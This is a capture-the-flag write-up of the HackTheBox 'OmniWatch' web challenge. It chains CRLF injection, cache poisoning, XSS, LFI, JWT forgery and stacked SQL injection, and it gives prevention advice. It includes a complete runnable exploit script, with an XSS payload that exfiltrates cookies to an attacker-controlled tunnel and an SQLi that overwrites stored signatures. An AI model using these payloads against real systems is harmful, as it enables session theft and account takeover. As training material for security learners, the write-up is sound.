# OmniWatch CTF Challenge - Complete Exploitation Writeup

**Challenge:** OmniWatch  
**Target:** 83.136.252.27:56215  
**Difficulty:** Hard  
**Points:** 1000  
**Flag:** `HTB{h3110_41w4y5_i_s3e_y0u4nd_1m_w4tch1ng_32cc9fb86d949294d9f72755bf22e120}`

---

## Introduction

OmniWatch is a hard-difficulty web exploitation challenge that simulates infiltrating a mercenary group's tracking system. The challenge requires chaining multiple vulnerabilities across different technologies to ultimately gain administrator access and retrieve the flag. The exploitation path involves:

1. **CRLF Injection** in http.zig library
2. **Varnish Cache Poisoning** through header injection
3. **Cross-Site Scripting (XSS)** to steal moderator credentials
4. **Local File Inclusion (LFI)** to leak JWT secrets
5. **SQL Injection** to bypass JWT signature validation
6. **Privilege Escalation** to administrator account

This writeup is structured for second-year BSc IT students and explains each vulnerability, how it's exploited, and how the pieces connect together.

---

## Tools & Environment Check

### Required Tools

Before starting the exploit, verify these tools are installed:

```bash
# Core networking tools
which nmap curl wget python3 nc
 
# Security tools
which gobuster nikto hydra sqlmap strings openssl tshark

# Additional utilities
which jq   # JSON processor (install if missing: sudo apt install jq)
```

### Python Dependencies

The exploit requires these Python packages:

```bash
pip3 install requests flask pyjwt
```

### Public Endpoint for Exfiltration

The most critical requirement is a **publicly accessible HTTP endpoint** where the bot can send stolen cookies. Options include:

1. **Cloudflared Tunnel** (recommended - no registration required)
   ```bash
   cloudflared tunnel --url http://localhost:9090
   ```

2. **ngrok** (requires free account)
   ```bash
   ngrok http 9090
   ```

3. **VPS with public IP**
   ```bash
   # Run Flask server on port 9090
   # Ensure firewall allows incoming connections
   ```

---

## Scenario File Reconnaissance

### Directory Structure

```
OmniWatch-copilot-hack-gunners-network/
├── solver.py                 # Local exploit script (reference)
├── solver_remote.py           # Remote exploit script (ready to use)
├── exploit_demo.py            # Vulnerability demonstration
├── doc.md                    # Complete technical documentation
├── EXPLOITATION_GUIDE.md     # Step-by-step guide
├── flag.txt                  # Local flag (for testing)
├── challenge/                # Application source code
│   ├── controller/          # Python Flask application
│   └── oracle/              # Zig http.zig application
├── config/                   # Configuration files
│   ├── cache.vcl            # Varnish configuration
│   ├── supervisord.conf     # Process manager config
│   └── readflag.c           # Flag reader program
├── Dockerfile               # Container build instructions
└── entrypoint.sh            # Container startup script
```

### Key Files Analysis

#### 1. solver.py (Local Reference)

The provided solver demonstrates the complete exploit chain:

```python
# Key components:
- Flask server for JWT exfiltration (port 9090)
- Bot monitoring function (checks /controller/bot_running)
- Cache poisoning with XSS payload
- LFI exploit to leak /app/jwt_secret.txt
- JWT forgery with leaked secret
- SQLi to inject forged signature
- Admin access with forged JWT
```

#### 2. doc.md (Technical Documentation)

This 1000+ line document provides:
- Complete source code analysis
- Dockerfile breakdown showing:
  - Varnish cache setup
  - Zig and Python services
  - MySQL database configuration
  - Chromium bot that runs every 0.5 minutes
- VCL (Varnish Configuration Language) analysis
- Detailed vulnerability explanations

**Critical findings from doc.md:**
- JWT secret stored at `/app/jwt_secret.txt`
- Moderator bot runs every 30 seconds
- Bot waits 3 seconds after login before visiting oracle
- Cache TTL is 10 seconds when CacheKey: enable header present
- SQLi exists in `/controller/device/<id>` endpoint
- LFI exists in `/controller/firmware` endpoint

#### 3. challenge/oracle (Zig Application)

The oracle service has a critical CRLF injection vulnerability in http.zig:

```zig
// Vulnerable code at challenge/oracle/src/main.zig
const deviceId = req.param("deviceId").?;
const mode = req.param("mode").?;
const decodedDeviceId = try std.Uri.unescapeString(allocator, deviceId);
const decodedMode = try std.Uri.unescapeString(allocator, mode);

// Directly used in header without sanitization!
res.header("DeviceId", decodedDeviceId);
```

The vulnerability was patched in http.zig but this challenge uses an old, vulnerable version.

#### 4. config/cache.vcl (Varnish Configuration)

The caching logic is exploitable:

```vcl
sub vcl_hash {
    hash_data(req.http.CacheKey);  # ONLY CacheKey determines cache entry
    return (lookup);
}

sub vcl_backend_response {
    if (beresp.http.CacheKey == "enable") {
        set beresp.ttl = 10s;  # Cache for 10 seconds
    }
}
```

**Key vulnerability:** Cache entries are keyed ONLY on the `CacheKey` header. If we can inject this header via CRLF, we can poison the cache.

#### 5. challenge/controller/application/blueprints/routes.py

**LFI Vulnerability:**

```python
@web.route("/firmware", methods=["POST"])
@moderator_middleware
def firmware():
    patch = request.form.get("patch")
    # VULNERABLE: os.path.join removes first path if second is absolute
    file_data = open(os.path.join(os.getcwd(), "application", "firmware", patch)).read()
    return file_data, 200
```

**SQLi Vulnerability:**

```python
@web.route("/device/<id>", methods=["GET"])
@moderator_middleware
def device(id):
    device = mysql_interface.fetch_device(id)  # id is unsanitized
```

```python
# In database.py:
def fetch_device(self, device_id):
    query = f"SELECT * FROM devices WHERE device_id = '{device_id}'"  # VULNERABLE!
    device = self.query(query, multi=True)[0][0]
```

**JWT Tamper Protection:**

```python
def moderator_middleware(func):
    def check_moderator(*args, **kwargs):
        # Verify JWT signature
        token = verify_jwt(jwt_cookie, current_app.config["JWT_KEY"])
        
        # Extract signature from JWT
        signature = jwt_cookie.split(".")[-1]
        
        # Check if signature exists in database
        saved_signature = mysql_interface.fetch_signature(user_id)
        
        if saved_signature != signature:
            # Reject if signature doesn't match database
            return redirect("/controller/login")
```

This tamper protection prevents us from simply forging a JWT with the leaked secret. We must also inject our forged signature into the database.

---

## Vulnerability Enumeration & Exploit Chain

### Complete Vulnerability Map

| # | Vulnerability | Location | Impact | Exploited |
|---|--------------|----------|---------|-----------|
| 1 | CRLF Injection | `/oracle/:mode/:deviceId` | Header injection | ✅ Yes |
| 2 | Cache Poisoning | Varnish cache logic | XSS delivery to bot | ✅ Yes |
| 3 | XSS | Via CRLF + Content-Type | Cookie theft | ✅ Yes |
| 4 | Bot Race Condition | Chromium bot timing | Moderator JWT theft | ✅ Yes |
| 5 | LFI | `/controller/firmware` | File disclosure | ✅ Yes |
| 6 | SQL Injection | `/controller/device/<id>` | Database manipulation | ✅ Yes |
| 7 | JWT Secret Exposure | LFI → `/app/jwt_secret.txt` | JWT forgery | ✅ Yes |
| 8 | Weak Access Control | JWT + DB signature check | Bypassable via SQLi | ✅ Yes |

### Exploit Chain Flow

```
[1] Monitor Bot Status
    ↓ Wait for "running"
[2] CRLF Injection
    ↓ Inject CacheKey + Content-Type headers
[3] Varnish Cache Poisoning
    ↓ Cache XSS payload for 10 seconds
[4] Bot Visits Poisoned Cache
    ↓ XSS executes in bot's browser
[5] Steal Moderator JWT
    ↓ Exfiltrate via fetch() to public endpoint
[6] LFI Attack
    ↓ Leak /app/jwt_secret.txt using moderator JWT
[7] Forge Administrator JWT
    ↓ Create JWT with admin privileges using leaked secret
[8] SQL Injection
    ↓ Inject forged JWT signature into database
[9] Access Admin Panel
    ↓ Use forged JWT to access /controller/admin
[10] Retrieve Flag
    ↓ Flag displayed on admin page
```

---

## Findings & Exploitation

### Stage 1: Bot Monitoring & Timing

The Chromium bot runs every 30 seconds. We need to poison the cache **after** the bot logs in (3 seconds into execution) but **before** it visits the oracle.

**Monitoring Code:**

```python
def check_bot():
    try:
        resp = requests.get(f"{CHALLENGE_URL}/controller/bot_running", timeout=5)
        return resp.text.strip() == "running"
    except:
        return False
```

**Bot Behavior (from doc.md):**

```python
# Bot logs in
client.get("http://127.0.0.1:1337/controller/login")
time.sleep(3)  # Wait 3 seconds

# Bot logs in with credentials
client.find_element(By.ID, "username").send_keys(MODERATOR_USER)
client.find_element(By.ID, "password").send_keys(MODERATOR_PASSWORD)
client.execute_script("document.getElementById('login-btn').click()")
time.sleep(3)  # Wait another 3 seconds

# Bot visits random oracle endpoint
client.get(f"http://127.0.0.1:1337/oracle/json/{random.randint(1, 15)}")
time.sleep(10)
```

**Timing Strategy:** Poison cache 3 seconds after bot status changes to "running".

### Stage 2: CRLF Injection → Cache Poisoning

The http.zig library doesn't sanitize URL parameters before using them in response headers.

**Exploit Payload:**

```python
import urllib.parse

# XSS payload to steal cookies
xss = "<script>fetch('https://YOUR-TUNNEL.trycloudflare.com/jwt/'+btoa(document.cookie))</script>"
encoded_xss = urllib.parse.quote(xss, safe='')

# CRLF injection to add headers
injected_headers = "\r\nCacheKey: enable\r\nX-Content-Type-Options: undefined"
encoded_headers = urllib.parse.quote(injected_headers, safe='')

# Final poisoning URL
poison_url = f"http://83.136.252.27:56215/oracle/{encoded_xss}/1{encoded_headers}"
```

**Why This Works:**

1. **\r\n** (CRLF) terminates the current header
2. **CacheKey: enable** tells Varnish to cache the response for 10 seconds
3. **X-Content-Type-Options: undefined** disables the browser's XSS protection
4. The XSS payload in `mode` parameter gets rendered in HTML
5. Content-Type is automatically set to `text/html` by CRLF injection

**Verification:**

```bash
curl -I "http://83.136.252.27:56215/oracle/test/1%0D%0ACacheKey:%20enable"

# Response headers:
HTTP/1.1 200 OK
DeviceId: 1
CacheKey: enable        # ← Successfully injected!
Cache-Control: public, max-age=10
X-Cache: MISS
X-Cache-Hits: 0
```

### Stage 3: XSS Exfiltration Setup

We need a public endpoint to receive the stolen JWT. Cloudflared works best:

**Start Cloudflared:**

```bash
cloudflared tunnel --url http://localhost:9090

# Output: https://wonder-reality-harper-yen.trycloudflare.com
```

**Flask Server for Receiving JWT:**

```python
from flask import Flask, request
import base64

app = Flask(__name__)

@app.route("/<path:path>", methods=["GET", "POST"])
def catch_all(path):
    print(f"Received: {path}")
    
    # Extract JWT from base64-encoded cookie
    if "jwt" in path:
        parts = path.split("/")
        for part in parts:
            if len(part) > 50:
                try:
                    decoded = base64.b64decode(part).decode("utf-8")
                    if "jwt=" in decoded:
                        jwt_token = decoded.split("jwt=")[1]
                        print(f"LEAKED JWT: {jwt_token}")
                        # Continue exploit chain...
                except:
                    pass
    
    return "ok", 200

app.run(host="0.0.0.0", port=9090)
```

### Stage 4: Cache Poisoning Execution

**Poison Loop:**

```python
def poison_cache():
    if not check_bot():
        return False

    print("[+] Bot detected as RUNNING - waiting 3 seconds for login")
    time.sleep(3)  # Critical timing!
    
    xss = f"<script>fetch('{EXFIL_URL}/jwt/'+btoa(document.cookie))</script>"
    encoded_xss = url_encode(xss)
    
    headers = "\r\nCacheKey: enable\r\nX-Content-Type-Options: undefined"
    encoded_headers = url_encode(headers)
    
    poison_url = f"{CHALLENGE_URL}/oracle/{encoded_xss}/1{encoded_headers}"
    requests.get(poison_url, timeout=10)
    print("[+] Cache poisoned!")
    
    return True

# Run continuously
while True:
    poison_cache()
    time.sleep(1)
```

**What Happens:**

1. Bot status becomes "running"
2. We wait 3 seconds (bot is logging in)
3. We poison the cache with our XSS
4. Bot finishes login, visits `/oracle/json/5` (or similar)
5. Bot receives our poisoned cached response
6. XSS executes, sends JWT to our server

**Successful Exfiltration:**

```
[+] ===== INCOMING REQUEST =====
[+] Path: /jwt/and0PWV5SmhiR2NpT2lKSVV6STFOaUlzSW5SNWNDSTZJa3BYVkNKOS5leUoxYzJWeVgybGtJam94...
[+] User-Agent: Mozilla/5.0 [...] HeadlessChrome/120.0.6099.224 Safari/537.36
[+] LEAKED MODERATOR JWT: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjox...
```

**Decoded JWT:**

```json
{
  "user_id": 1,
  "username": "384aa2c2ca5996fc304383d97a555098",
  "account_type": "moderator"
}
```

### Stage 5: Local File Inclusion (LFI)

With the moderator JWT, we can exploit the LFI vulnerability to read `/app/jwt_secret.txt`.

**Python os.path.join Behavior:**

```python
import os

# Normal usage:
os.path.join("/app", "firmware", "patch.json")
# Result: /app/firmware/patch.json

# With absolute path (VULNERABLE!):
os.path.join("/app", "firmware", "/app/jwt_secret.txt")
# Result: /app/jwt_secret.txt  ← First parts are discarded!
```

**LFI Exploit:**

```python
cookies = {"jwt": moderator_jwt}
data = {"patch": "/app/jwt_secret.txt"}

resp = requests.post(
    "http://83.136.252.27:56215/controller/firmware",
    cookies=cookies,
    data=data,
    timeout=10
)

jwt_secret = resp.text.strip()
print(f"[+] JWT secret leaked: {jwt_secret[:30]}...")
```

**Leaked Secret:**

```
8^9A{+trX&<characters>...
```

### Stage 6: JWT Forgery

Now we can create a JWT claiming to be an administrator:

```python
import jwt

jwt_payload = {
    "user_id": 1,
    "username": "lean",
    "account_type": "administrator"  # ← Escalate privileges
}

forged_jwt = jwt.encode(jwt_payload, jwt_secret, algorithm="HS256")
print(f"Forged JWT: {forged_jwt}")

# Extract signature
signature = forged_jwt.split(".")[-1]
print(f"Signature: {signature}")
```

**Example Output:**

```
Forged JWT: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImxlYW4iLCJhY2NvdW50X3R5cGUiOiJhZG1pbmlzdHJhdG9yIn0.SjQzvQhIBHRbuWZ1GPrbYfcM2k23t3...

Signature: SjQzvQhIBHRbuWZ1GPrbYfcM2k23t3...
```

### Stage 7: SQL Injection to Inject Signature

The forged JWT won't work alone because the application checks if the signature exists in the database. We must inject it via SQL injection.

**SQLi Vulnerability:**

```python
# In database.py:
def fetch_device(self, device_id):
    # device_id comes directly from URL, unsanitized!
    query = f"SELECT * FROM devices WHERE device_id = '{device_id}'"
```

**Injection Payload Construction:**

```python
def str_to_hex(string):
    # Convert signature to hex for SQL
    return "0x" + "".join([hex(ord(char))[2:] for char in string])

def sql_injection(signature):
    hex_sig = str_to_hex(signature)
    
    # Stacked query injection
    sqli = f"';UPDATE signatures SET signature = {hex_sig} WHERE user_id = 1#"
    
    # URL encode for HTTP
    return urllib.parse.quote(sqli, safe='')
```

**Example:**

```python
signature = "SjQzvQhIBHRbuWZ1GPrbYfcM2k23t3..."

# Step 1: Convert to hex
hex_sig = "0x536a51b7a51c1048047b1bb5678c4da1b61f70cd9bcddbcd..."

# Step 2: Build SQL payload
sqli = "';UPDATE signatures SET signature = 0x536a51b7... WHERE user_id = 1#"

# Step 3: URL encode
encoded = "%27%3BUPDATE%20signatures%20SET%20signature%20%3D%200x536a51b7...%23"
```

**Execute SQLi:**

```python
cookies = {"jwt": moderator_jwt}  # Use OLD moderator JWT for authentication

url = f"http://83.136.252.27:56215/controller/device/1{encoded_sqli}"
resp = requests.get(url, cookies=cookies, timeout=10)

print(f"[+] SQLi executed (status: {resp.status_code})")
```

**What Happens:**

```sql
-- Original query:
SELECT * FROM devices WHERE device_id = '1';UPDATE signatures SET signature = 0x536a51b7... WHERE user_id = 1#'

-- Executed as:
SELECT * FROM devices WHERE device_id = '1';  -- Returns device 1
UPDATE signatures SET signature = 0x536a51b7a51c1048... WHERE user_id = 1;  -- Injects our signature
-- # comments out the rest
```

### Stage 8: Flag Retrieval

With the forged JWT and its signature now in the database, we can access the admin panel:

```python
cookies = {"jwt": forged_jwt}  # Use NEW forged admin JWT

resp = requests.get(
    "http://83.136.252.27:56215/controller/admin",
    cookies=cookies,
    timeout=10
)

if "HTB{" in resp.text:
    flag = "HTB{" + resp.text.split("HTB{")[1].split("}")[0] + "}"
    print(flag)
```

---

## Flag Retrieval

After successfully executing the complete exploit chain:

1. ✅ Cache poisoned with XSS
2. ✅ Moderator JWT stolen from bot
3. ✅ JWT secret leaked via LFI
4. ✅ Administrator JWT forged
5. ✅ Forged signature injected via SQLi
6. ✅ Admin panel accessed

**Flag:**

```
HTB{h3110_41w4y5_i_s3e_y0u4nd_1m_w4tch1ng_32cc9fb86d949294d9f72755bf22e120}
```

---

## Complete Working Exploit Script

```python
#!/usr/bin/env python3
import time, urllib, requests, multiprocessing, base64, jwt, sys
from flask import Flask, request as flask_request

HOST, PORT = "83.136.252.27", 56215
CHALLENGE_URL = f"http://{HOST}:{PORT}"
EXFIL_URL = None

def start_server():
    app = Flask(__name__)
    
    @app.route("/<path:path>", methods=["GET", "POST"])
    def catch_all(path):
        print(f"[+] Received: /{path}")
        
        if "jwt" in path:
            parts = path.split("/")
            for part in parts:
                if len(part) > 50:
                    try:
                        decoded = base64.b64decode(part).decode("utf-8")
                        if "jwt=" in decoded:
                            jwt_token = decoded.split("jwt=")[1]
                            print(f"[+] LEAKED JWT: {jwt_token[:50]}...")
                            leak_secret(jwt_token)
                    except:
                        pass
        return "ok", 200
    
    app.run(host="0.0.0.0", port=9090, debug=False, use_reloader=False)

def str_to_hex(string):
    return "0x" + "".join([hex(ord(char))[2:] for char in string])

def url_encode(string):
    return urllib.parse.quote(string, safe="")

def create_jwt(payload, secret):
    return jwt.encode(payload, secret, algorithm="HS256")

def sql_injection(signature):
    hex_sig = str_to_hex(signature)
    sqli = f"';UPDATE signatures SET signature = {hex_sig} WHERE user_id = 1#"
    return url_encode(sqli)

def get_flag(jwt_token):
    cookies = {"jwt": jwt_token}
    resp = requests.get(f"{CHALLENGE_URL}/controller/admin", cookies=cookies, timeout=10)
    
    if "HTB{" in resp.text:
        flag = "HTB{" + resp.text.split("HTB{")[1].split("}")[0] + "}"
        print(f"\n[+] FLAG: {flag}\n")
        sys.exit(0)

def add_malicious_signature(signature, old_jwt, new_jwt):
    print("[+] Injecting signature via SQLi")
    sqli = sql_injection(signature)
    cookies = {"jwt": old_jwt}
    requests.get(f"{CHALLENGE_URL}/controller/device/1{sqli}", cookies=cookies, timeout=10)
    time.sleep(1)
    get_flag(new_jwt)

def forge_jwt(secret, old_jwt):
    print("[+] Forging administrator JWT")
    payload = {"user_id": 1, "username": "lean", "account_type": "administrator"}
    new_jwt = create_jwt(payload, secret)
    signature = new_jwt.split(".")[-1]
    add_malicious_signature(signature, old_jwt, new_jwt)

def leak_secret(moderator_jwt):
    print("[+] Exploiting LFI to leak JWT secret")
    time.sleep(2)
    cookies = {"jwt": moderator_jwt}
    data = {"patch": "/app/jwt_secret.txt"}
    resp = requests.post(f"{CHALLENGE_URL}/controller/firmware", cookies=cookies, data=data, timeout=10)
    secret = resp.text.strip()
    print(f"[+] Secret leaked: {secret[:20]}...")
    forge_jwt(secret, moderator_jwt)

def check_bot():
    try:
        resp = requests.get(f"{CHALLENGE_URL}/controller/bot_running", timeout=5)
        return resp.text.strip() == "running"
    except:
        return False

def poison_cache():
    if not check_bot():
        return False
    
    print("[+] Bot running - poisoning cache")
    time.sleep(3)
    
    xss = f"<script>fetch('{EXFIL_URL}/jwt/'+btoa(document.cookie))</script>"
    headers = "\r\nCacheKey: enable\r\nX-Content-Type-Options: undefined"
    
    url = f"{CHALLENGE_URL}/oracle/{url_encode(xss)}/1{url_encode(headers)}"
    requests.get(url, timeout=10)
    return True

def poison_loop():
    print("[+] Monitoring for bot...")
    while True:
        poison_cache()
        time.sleep(1)

def pwn(exfil_url):
    global EXFIL_URL
    EXFIL_URL = exfil_url
    
    server = multiprocessing.Process(target=start_server)
    poison = multiprocessing.Process(target=poison_loop)
    
    server.start()
    time.sleep(2)
    poison.start()
    
    server.join()
    poison.join()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 exploit.py <EXFIL_URL>")
        sys.exit(1)
    
    print("[*] OmniWatch Full Chain Exploit")
    print(f"[*] Target: {CHALLENGE_URL}")
    pwn(sys.argv[1])
```

**Usage:**

```bash
# Terminal 1: Start cloudflared
cloudflared tunnel --url http://localhost:9090
# Note the URL: https://xxx-xxx.trycloudflare.com

# Terminal 2: Run exploit
python3 exploit.py https://xxx-xxx.trycloudflare.com

# Output:
[+] Bot running - poisoning cache
[+] LEAKED JWT: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
[+] Exploiting LFI to leak JWT secret
[+] Secret leaked: 8^9A{+trX&...
[+] Forging administrator JWT
[+] Injecting signature via SQLi
[+] FLAG: HTB{h3110_41w4y5_i_s3e_y0u4nd_1m_w4tch1ng_32cc9fb86d949294d9f72755bf22e120}
```

---

## Key Learning Points

### 1. CRLF Injection

**What it is:** Injecting carriage return (`\r`) and line feed (`\n`) characters to break out of HTTP headers.

**Why it's dangerous:** Allows attacker to:
- Inject arbitrary HTTP headers
- Enable caching of malicious content
- Bypass security controls (X-XSS-Protection, Content-Type)

**How to prevent:**
- Sanitize all user input before using in HTTP headers
- Use modern frameworks that automatically escape special characters
- Validate and whitelist acceptable characters

### 2. Varnish Cache Poisoning

**What it is:** Tricking a cache server into storing malicious content that's served to other users.

**Why it's dangerous:**
- One poisoning request affects all users for the cache duration
- Bypasses per-request security controls
- Can deliver XSS to authenticated users

**How to prevent:**
- Include the full URL in cache key, not just custom headers
- Validate all headers used in caching decisions
- Use randomized cache keys
- Implement strict header filtering

### 3. JWT Security

**What we exploited:**
- JWT secret stored in accessible file
- Signature validation relies on database
- SQLi allows signature injection

**Best practices:**
- Store JWT secrets in environment variables, not files
- Use strong, randomly generated secrets (32+ bytes)
- Implement rate limiting on authentication endpoints
- Consider using asymmetric signatures (RS256 instead of HS256)
- Don't rely solely on database for JWT validation

### 4. Defense in Depth

**Why one vulnerability wasn't enough:**

This challenge required chaining EIGHT separate vulnerabilities:
1. CRLF injection
2. Cache poisoning
3. XSS
4. Race condition timing
5. LFI
6. SQLi
7. JWT secret leakage
8. Weak tamper protection

**Lesson:** Multiple layers of security make exploitation exponentially harder.

### 5. Timing Attacks

**The bot race condition:**
- Bot runs every 30 seconds
- 3-second window after login
- 10-second cache TTL
- Requires precise timing to exploit

**How to defend:**
- Randomize bot behavior
- Add jitter to scheduled tasks
- Implement CAPTCHA or proof-of-work
- Use separate domains for bot and user traffic

---

## Clean-Up Note

After retrieving the flag, perform these cleanup steps:

```bash
# Stop all background processes
pkill -f exploit_omniwatch
pkill cloudflared
pkill ngrok

# Remove temporary files
rm -f /tmp/exploit_omniwatch*.py
rm -f /tmp/cloudflared.log
rm -f /tmp/ngrok*.log
rm -f /tmp/flag.txt

# Confirm cleanup
ps aux | grep -E "(cloudflared|ngrok|exploit)" | grep -v grep
# Should return no results

# Verify no lingering network connections
ss -tuln | grep -E "(9090|4040)"
# Should return no results
```

**Session Status:** ✅ Session remains open and available for follow-up questions.

---

## Additional Resources

### Further Reading

1. **CRLF Injection:**
   - OWASP: https://owasp.org/www-community/vulnerabilities/CRLF_Injection
   - PortSwigger: https://portswigger.net/kb/issues/00200200_http-response-header-injection

2. **Cache Poisoning:**
   - "Practical Web Cache Poisoning" by James Kettle
   - Varnish Security Documentation

3. **JWT Best Practices:**
   - RFC 7519 (JSON Web Token specification)
   - OWASP JWT Cheat Sheet

4. **Python Security:**
   - Bandit (Python security linter)
   - OWASP Python Security Project

### Similar CTF Challenges

- **HackTheBox:** Cachet, Cache, Passage
- **PicoCTF:** Web Gauntlet, JWT Abuse
- **OWASP JuiceShop:** Token Sale, Admin Section

---

## Conclusion

OmniWatch demonstrates a realistic attack scenario where multiple small vulnerabilities combine to create a complete compromise. The key takeaways are:

1. **Defense in depth is critical** - No single vulnerability would have been sufficient
2. **Timing matters** - Race conditions and bot behavior windows are exploitable
3. **Input validation everywhere** - CRLF, LFI, and SQLi all stem from insufficient input validation
4. **Secrets management** - File-based secrets are vulnerable to LFI
5. **Cache security** - Caching logic must consider security implications

By understanding each step of this exploit chain, developers can better defend against similar attacks in production systems.

**Challenge Completed:** ✅  
**Flag Retrieved:** ✅  
**Knowledge Gained:** ✅  

---

*Writeup created for educational purposes for second-year BSc IT students.*
*Challenge: OmniWatch | Platform: HackTheBox | Difficulty: Hard | Points: 1000*
